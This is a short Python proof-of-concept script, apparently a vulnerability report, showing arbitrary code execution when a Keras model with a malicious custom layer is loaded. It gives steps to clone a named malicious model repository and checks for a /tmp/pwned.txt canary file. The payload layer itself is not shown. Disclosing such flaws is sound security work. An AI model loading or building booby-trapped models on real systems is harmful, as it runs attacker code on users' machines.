"""
PoC: Keras Malicious Custom Layer Code Execution
Model: xiaoyaoes/malicious-keras-text-encoder
Format: Keras Native (.keras)
Severity: CRITICAL (Arbitrary Code Execution)

STEPS TO REPRODUCE:
1. Clone the model:
   git clone https://huggingface.co/xiaoyaoes/malicious-keras-text-encoder
   cd malicious-keras-text-encoder

2. Run verification:
   python3 poc.py

EXPECTED: File /tmp/pwned.txt created with "CODE EXECUTED! Type: base64"
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from custom_layer import MaliciousEncoder
from keras.models import load_model

print("[*] Loading malicious Keras model...")
model = load_model("model.keras", custom_objects={"CustomMalicious>MaliciousEncoder": MaliciousEncoder})
print(f"[+] Model loaded: {model.name}")

if os.path.exists("/tmp/pwned.txt"):
    with open("/tmp/pwned.txt") as f:
        print(f"[!] CODE EXECUTED: {f.read().strip()}")
    print("[!] Vulnerability confirmed: arbitrary code execution on model load")
else:
    print("[-] No execution")
